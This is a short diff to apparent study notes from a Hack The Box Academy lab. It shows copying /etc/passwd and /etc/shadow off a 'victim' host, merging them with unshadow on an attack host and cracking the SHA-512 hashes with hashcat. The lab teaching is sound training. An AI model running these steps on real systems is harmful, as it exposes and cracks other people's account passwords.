@@ -4,5 +4,13 @@ Using unshadow:
 ```
 victim$ sudo cp /etc/passwd /tmp/passwd.bak 
 victim$ sudo cp /etc/shadow /tmp/shadow.bak 
-Avalon112@htb[/htb]$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
+#Transfer these files to attackhost
+AttackHost$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
 ```
+
+Using hashcat to crack unshadowed hash:
+```
+hashcat -m 1800 -a 0 <hashfile> <wordlist> -o <outputfile>
+```
+
+Ref: https://academy.hackthebox.com/app/module/147/section/1319
